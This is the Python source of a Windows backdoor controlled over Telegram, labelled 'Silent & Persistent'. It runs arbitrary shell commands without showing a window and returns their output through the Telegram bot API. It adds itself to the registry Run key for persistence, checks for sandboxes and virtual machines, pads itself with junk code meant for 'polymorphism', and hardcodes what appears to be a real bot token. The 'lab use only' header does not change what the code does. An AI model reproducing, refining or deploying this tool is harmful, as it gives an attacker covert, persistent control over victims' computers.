#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Telegram CMD Bot – Silent & Persistent
Authorized use only in private, isolated virtual lab.
"""

import asyncio
import os
import subprocess
import sys
import time
import winreg
from pathlib import Path
import threading
import requests  # for sending messages without PTB

# ---- Token (explicit, as provided) ----
TOKEN = "8712703116:AAHIM3J2jUehA9Gp1bNSA6LJUge9CsQVnpM"

# ---- Junk code for polymorphism/padding ----
def __junk():
    _ = [x for x in range(10)]
    __ = {i: i**2 for i in range(5)}
    pass

# ---- Sandbox evasion (no wmic dependency) ----
def _is_sandbox():
    """Return True if common VM artifacts are detected."""
    try:
        output = subprocess.check_output("systeminfo | findstr /i 'System Model'", shell=True, timeout=5)
        if output:
            model = output.decode().lower()
            vm_indicators = ["vbox", "vmware", "qemu", "virtual", "xen"]
            if any(ind in model for ind in vm_indicators):
                return True
    except Exception:
        pass
    # Check for low RAM (< 4GB) – fallback if wmic exists
    try:
        result = subprocess.run("wmic os get TotalVisibleMemorySize", capture_output=True, text=True, shell=True, timeout=3)
        if result.returncode == 0:
            lines = result.stdout.split()
            if len(lines) > 1:
                total_ram = int(lines[1])
                if total_ram < 4_000_000:
                    return True
    except Exception:
        pass
    try:
        cpu_count = os.cpu_count()
        if cpu_count and cpu_count < 2:
            return True
    except Exception:
        pass
    return False

# ---- Configuration ----
DEFAULT_DIR = f"C:\\Users\\{os.getenv('USERNAME')}"
CHAT_ID_FILE = Path(os.getenv('APPDATA')) / "telegram_cmd_bot_chat_id.txt"
PERSISTENCE_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
PERSISTENCE_NAME = "TelegramCmdBot"

# ---- Utility functions ----
def set_persistence(enable=True):
    """Add or remove the bot from Windows startup."""
    key = winreg.HKEY_CURRENT_USER
    try:
        with winreg.OpenKey(key, PERSISTENCE_KEY, 0, winreg.KEY_SET_VALUE) as reg_key:
            if enable:
                pythonw = sys.executable.replace("python.exe", "pythonw.exe")
                script = os.path.abspath(__file__)
                cmd = f'"{pythonw}" "{script}"'
                winreg.SetValueEx(reg_key, PERSISTENCE_NAME, 0, winreg.REG_SZ, cmd)
            else:
                winreg.DeleteValue(reg_key, PERSISTENCE_NAME)
    except Exception as e:
        print(f"Persistence operation failed: {e}")

def run_cmd(command, cwd=None):
    """Execute a CMD command silently and return (stdout, stderr)."""
    if not cwd:
        cwd = DEFAULT_DIR
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    process = subprocess.Popen(
        command,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        shell=True,
        cwd=cwd,
        startupinfo=startupinfo,
        creationflags=subprocess.CREATE_NO_WINDOW,
        text=True
    )
    stdout, stderr = process.communicate(timeout=60)
    return stdout, stderr

def is_connected():
    try:
        import urllib.request
        urllib.request.urlopen("https://www.google.com", timeout=5)
        return True
    except Exception:
        return False

def save_chat_id(chat_id):
    with open(CHAT_ID_FILE, 'w') as f:
        f.write(str(chat_id))

def load_chat_id():
    if CHAT_ID_FILE.exists():
        with open(CHAT_ID_FILE, 'r') as f:
            return int(f.read().strip())
    return None

# ---- Background thread to send "Active" message ----
def send_active_message_thread():
    """Runs in a separate thread, waits for internet, then sends 'Active' via API."""
    chat_id = load_chat_id()
    if not chat_id:
        return
    # Wait until connected
    while not is_connected():
        time.sleep(5)
    # Send message using direct API call (avoids PTB version issues)
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    try:
        response = requests.post(url, json={"chat_id": chat_id, "text": "✅ Bot is now active and online."}, timeout=10)
        if response.status_code != 200:
            print(f"Failed to send active message: {response.text}")
    except Exception as e:
        print(f"Error sending active message: {e}")

# ---- Telegram Bot Handlers ----
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

current_dir = DEFAULT_DIR

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    save_chat_id(chat_id)
    await update.message.reply_text(
        "🤖 Bot active.\n"
        "Commands:\n"
        "/cmd <command> - execute CMD\n"
        "/cd <path> - change working directory\n"
        "/pwd - show current directory\n"
        "/help - this message"
    )

async def cmd_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_dir
    user_input = update.message.text
    if not user_input.startswith('/cmd '):
        return
    command = user_input[5:].strip()
    if not command:
        await update.message.reply_text("Usage: /cmd <command>")
        return
    try:
        out, err = run_cmd(command, cwd=current_dir)
        response = f"📁 {current_dir}\n$ {command}\n"
        if out:
            response += out
        if err:
            response += "\n[stderr]\n" + err
        if not response.strip():
            response = "(no output)"
        if len(response) > 4000:
            response = response[:4000] + "\n... (truncated)"
        await update.message.reply_text(response)
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

async def cd_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_dir
    user_input = update.message.text
    if not user_input.startswith('/cd '):
        return
    new_path = user_input[4:].strip()
    if not new_path:
        await update.message.reply_text("Usage: /cd <path>")
        return
    try:
        full_path = os.path.abspath(os.path.join(current_dir, new_path))
        if os.path.isdir(full_path):
            current_dir = full_path
            await update.message.reply_text(f"✅ Directory changed to: {current_dir}")
        else:
            await update.message.reply_text(f"❌ Directory not found: {full_path}")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

async def pwd_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_dir
    await update.message.reply_text(f"📁 {current_dir}")

async def help_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 Commands:\n"
        "/cmd <command> - execute CMD\n"
        "/cd <path> - change directory\n"
        "/pwd - show current directory\n"
        "/help - this message"
    )

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print(f"Update {update} caused error {context.error}")

# ---- Main ----
def main():
    # Sandbox evasion
    if _is_sandbox():
        print("Sandbox detected – running in limited mode.")
        # Optionally exit: sys.exit(0)

    # Install / uninstall
    if len(sys.argv) > 1:
        if sys.argv[1] == "--install":
            set_persistence(True)
            print("Persistence installed.")
            sys.exit(0)
        elif sys.argv[1] == "--uninstall":
            set_persistence(False)
            print("Persistence removed.")
            sys.exit(0)
        else:
            print("Usage: python bot.py [--install | --uninstall]")
            sys.exit(1)

    global current_dir
    current_dir = DEFAULT_DIR

    # Build the application
    application = Application.builder().token(TOKEN).build()

    # Register handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_handler))
    application.add_handler(CommandHandler("cmd", cmd_handler))
    application.add_handler(CommandHandler("cd", cd_handler))
    application.add_handler(CommandHandler("pwd", pwd_handler))
    application.add_error_handler(error_handler)

    # Start a background thread to send "Active" message after internet is up
    active_thread = threading.Thread(target=send_active_message_thread, daemon=True)
    active_thread.start()

    # Start polling (this blocks)
    print("Bot is running...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()